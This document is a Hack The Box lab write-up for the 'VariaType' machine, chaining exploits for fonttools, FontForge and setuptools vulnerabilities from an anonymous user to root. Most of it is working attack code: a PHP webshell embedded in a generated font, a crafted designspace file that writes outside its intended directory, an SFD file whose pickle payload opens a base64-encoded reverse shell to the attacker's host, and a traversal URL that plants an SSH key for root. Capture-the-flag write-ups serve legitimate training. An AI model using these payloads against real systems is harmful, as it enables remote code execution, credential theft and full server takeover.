# VariaType — HTB Lab Writeup

**Difficulty:** Hard
**OS:** Linux (Debian 12 Bookworm)
**IP:** 10.129.5.78
**Attack Chain:** CVE-2025-66034 → CVE-2025-15276 → CVE-2025-47273

```
initial → fonttools arbitrary file write (www-data) → FontForge SFD pickle deserialization (steve) → setuptools path traversal (root)
```

---

## Enumeration

### Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 -oA nmap_full 10.129.5.78
```

Two ports open:

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.2p1 (Debian 12) |
| 80 | HTTP | nginx 1.22.1 |

### Web Enumeration

The main site at `variatype.htb` is a Flask application — "VariaType Labs — Variable Font Generator." It accepts `.designspace` (XML) and `.ttf/.otf` master font uploads at:

```
POST /tools/variable-font-generator/process  (multipart/form-data)
```

The backend uses **fonttools** and **fontmake** to build variable fonts from the uploaded sources.

### VHost Discovery

```bash
ffuf -H "Host: FUZZ.variatype.htb" -u http://10.129.5.78/ \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,302,403,500 -fs 169
```

Discovered `portal.variatype.htb` — a PHP application ("Internal Validation Portal," version VT-VALID-2.1.4) with a login form. `dev.variatype.htb` returned a 301 redirect to the main site (dead end).

### Exposed .git on Portal

The portal had an exposed `.git` directory. Using `git-dumper`:

```bash
git-dumper http://portal.variatype.htb/.git/ git_dump/
```

The git history contained three commits. Commit `753b5f5` ("fix: add gitbot user for automated validation pipeline") contained hardcoded credentials that were later "removed" in `6f021da` — but persisted in the git object history:

```
Username: gitbot
Password: G1tB0t_Acc3ss_2025!
```

These credentials authenticated to the portal, revealing a dashboard with processed font files, plus `view.php`, `download.php`, and a `/files/` directory. The `/files/` directory was accessible without authentication via direct HTTP requests.

A CSS comment on the portal leaked the server path: `/var/www/dev.variatype.htb/`.

---

## Initial Foothold — CVE-2025-66034 (fonttools Arbitrary File Write)

### The Vulnerability

CVE-2025-66034 (GHSA-768j-98cg-p3fv) affects fonttools 4.33.0 through 4.60.1. The `<variable-font filename="...">` attribute in `.designspace` XML files is passed directly to the output path with no sanitization. Combined with the fact that `<labelname>` CDATA content survives into the output binary, this gives:

1. **Arbitrary file write** — control where the file is written
2. **Content injection** — embed PHP code in the output file

The target ran Debian 12's default `python3-fonttools 4.38.0` — squarely in the vulnerable range.

### The Key Insight

Every PoC for this CVE demonstrates **relative path traversal** (`../shell.php`). Flask's input validation checked for `../` in the raw XML, and while entity encoding (`&#47;`) bypassed that check, the fontmake subprocess was sandboxed to `/tmp/` — relative traversal could never escape to the web root.

The breakthrough was realizing that "arbitrary file write" means exactly that. Python's `os.path.join(output_dir, filename)` **discards the first argument entirely** when `filename` starts with `/`. An absolute path bypasses both the `../` check and the `/tmp/` sandbox:

```xml
<variable-font name="TestFont-VF"
  filename="/var/www/portal.variatype.htb/public/files/shell.php">
```

Flask never checked for paths starting with `/`.

### The Exploit

**1. Create a master font with embedded PHP:**

Using fonttools' `FontBuilder`, a minimal TTF was created with a PHP webshell in the `familyName` name record:

```python
from fontTools.fontBuilder import FontBuilder
fb = FontBuilder(1000, isTTF=True)
fb.setupGlyphOrder([".notdef"])
fb.setupCharacterMap({})
fb.setupGlyf({".notdef": {"numberOfContours": 0}})
fb.setupHorizontalMetrics({".notdef": (500, 0)})
fb.setupHorizontalHeader()
fb.setupNameTable({
    "familyName": '<?php echo "---SHELLSTART---"; system($_GET["cmd"]); echo "---SHELLEND---"; ?>',
    "styleName": "Regular"
})
fb.setupOs2()
fb.setupPost()
fb.setupHead(unitsPerEm=1000)
fb.font.save("master_shell.ttf")
```

**2. Craft a malicious .designspace:**

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="4.1">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" default="400" maximum="900"/>
  </axes>
  <sources>
    <source filename="master_shell.ttf" familyname="TestFont" stylename="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="TestFont-VF"
      filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

**3. Upload:**

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -F "designspace=@exploit.designspace" \
  -F "masters=@master_shell.ttf" \
  http://variatype.htb/tools/variable-font-generator/process
# Returns: 200
```

**4. Verify RCE:**

```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A `shell_bridge.py` script was created to cleanly extract command output from between the `---SHELLSTART---`/`---SHELLEND---` markers embedded in the font binary.

---

## Privilege Escalation: www-data → steve — CVE-2025-15276 (FontForge SFD Pickle Deserialization)

### Local Enumeration

As `www-data`, enumeration revealed:
- **steve** is the user flag target (`/home/steve/user.txt`)
- A backup of steve's processing script at `/opt/process_client_submissions.bak` shows a cron job that iterates `.sfd` files in the portal's `/files/` directory and opens each with FontForge
- The portal `/files/` directory is **setgid writable** by www-data (`drwxrwsr-x www-data www-data`)
- FontForge was **custom-built from source** (version 20230101) at `/usr/local/src/fontforge/`

### The Vulnerability

CVE-2025-15276 (ZDI-25-1187) — FontForge's SFD file parser (`SFDUnPickle()` in `sfd.c`) calls Python's `pickle.loads()` on data from `PickledData:` fields. This is a classic insecure deserialization — pickle's `__reduce__` method allows arbitrary code execution on load.

### The Exploit

The cron job (~5 minute interval) runs:

```bash
fontforge -lang=py -c "font = fontforge.open('$file')"
```

on each `.sfd` file in `/files/`. Since `fontforge.open()` triggers SFD parsing → `SFDUnPickle()` → `pickle.loads()`, dropping a malicious `.sfd` gets code execution as steve.

**1. Craft the SFD payload:**

Pickle protocol 0 (ASCII) requires zero escaping inside SFD's double-quoted `PickledData:` field:

```
PickledData: "cos
system
(S'echo <base64-encoded-reverse-shell> | base64 -d | bash'
tR."
```

The full `.sfd` file:

```
SplineFontDB: 3.0
FontName: Payload
FullName: Payload
FamilyName: Payload
Weight: Medium
Copyright: Test
Version: 001.000
ItalicAngle: 0
UnderlinePosition: -100
UnderlineWidth: 50
Ascent: 800
Descent: 200
LayerCount: 2
Layer: 0 0 "Back" 1
Layer: 1 0 "Fore" 0
Encoding: ISO 8859-1
PickledData: "cos
system
(S'echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45MS80NDQ0IDA+JjEnID4vZGV2L251bGwgMj4mMSAm | base64 -d | bash'
tR."
BeginChars: 256 0
EndChars
EndSplineFont
```

**2. Deploy via webshell:**

```bash
# Base64-encode the .sfd, write to portal /files/ via webshell
target.sh "echo <base64_sfd> | base64 -d > /var/www/portal.variatype.htb/public/files/payload.sfd"
```

**3. Catch the shell:**

```bash
nc -lvnp 4444
# Wait ~5 minutes for cron...
# Connection from 10.129.5.78 — steve shell!
```

Since the reverse shell needed to survive FontForge's 30-second timeout, the payload used `nohup ... &` to background the shell process.

### User Flag

Rather than relying on the interactive shell, a second `.sfd` was deployed with an exfil payload:

```
os.system('cp /home/steve/user.txt /tmp/user_flag.txt && chmod 644 /tmp/user_flag.txt')
```

Then read via the www-data webshell:

```bash
target.sh 'cat /tmp/user_flag.txt'
# d5a7aa6c197ae9053dfb81115a6401a0
```

**user.txt:** `d5a7aa6c197ae9053dfb81115a6401a0`

---

## Privilege Escalation: steve → root — CVE-2025-47273 (setuptools PackageIndex Path Traversal)

### Sudo Enumeration

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

### The Vulnerability

`/opt/font-tools/install_validator.py` uses `setuptools.package_index.PackageIndex().download(plugin_url, PLUGIN_DIR)` to fetch a "validator plugin" from a URL. The target ran **setuptools 78.1.0** — vulnerable to CVE-2025-47273 (patched in 78.1.1).

The exploit leverages the same `os.path.join()` primitive seen in the foothold: when the URL-derived filename starts with `/`, `os.path.join(tmpdir, filename)` discards the tmpdir. The trick is using `%2f`-encoded slashes in the URL path — `urlparse` keeps them in the path segment, `unquote()` decodes them to `/`, and `os.path.join()` treats the result as an absolute path.

The script's URL validation only checked for max 10 literal `/` characters — but `%2f` doesn't count as a literal `/`.

### The Exploit

**1. Generate an SSH key pair:**

```bash
ssh-keygen -t ed25519 -f /tmp/variatype_exploit/root_key -N ""
```

**2. Start a custom HTTP server** that serves the public key for ANY request path (bypassing Python's `http.server` 404 on decoded paths):

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        with open("/tmp/variatype_exploit/root_key.pub", "rb") as f:
            self.wfile.write(f.read())

HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
```

**3. Trigger the write (as steve via reverse shell):**

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  'http://10.10.14.91:8000/%2froot%2f.ssh%2fauthorized_keys'
# Plugin installed at: /root/.ssh/authorized_keys
```

The URL breaks down as:
- Literal path: `/%2froot%2f.ssh%2fauthorized_keys` (only 1 literal `/` — passes the 10-slash check)
- After `unquote()`: `/root/.ssh/authorized_keys`
- `os.path.join(tmpdir, "/root/.ssh/authorized_keys")` → `/root/.ssh/authorized_keys`

**4. SSH as root:**

```bash
ssh -i /tmp/variatype_exploit/root_key root@10.129.5.78 'cat /root/root.txt'
# 1f118260bf378648b7b09fe63aea31be
```

**root.txt:** `1f118260bf378648b7b09fe63aea31be`

---

## Summary

| Step | Technique | CVE | From → To |
|------|-----------|-----|-----------|
| Recon | Exposed `.git` on portal vhost | — | Recovered `gitbot` credentials |
| Foothold | fonttools arbitrary file write via absolute path in `.designspace` | CVE-2025-66034 | anonymous → www-data |
| User | FontForge SFD pickle deserialization via cron-processed `.sfd` | CVE-2025-15276 | www-data → steve |
| Root | setuptools `PackageIndex.download()` path traversal via `%2f` encoding | CVE-2025-47273 | steve → root |

### Recurring Theme: `os.path.join()` Abuse

Two of the three CVEs exploited the same Python behavior: `os.path.join(base, user_input)` discards `base` when `user_input` starts with `/`. This appeared in:
- **CVE-2025-66034** — absolute path in `.designspace` `filename` attribute
- **CVE-2025-47273** — `%2f`-decoded absolute path from URL

When you see Python path construction with user-controlled input, check `os.path.join()` behavior first.

### Key Lesson

Every PoC for CVE-2025-66034 demonstrates relative path traversal (`../`). The actual vulnerability is **unsanitized path control** — `../` is one way to express a path, absolute paths are another. When a PoC technique isn't working, go back to what the primitive actually gives you, not what the example shows.

---

## Flags

```
user.txt: d5a7aa6c197ae9053dfb81115a6401a0
root.txt: 1f118260bf378648b7b09fe63aea31be
```
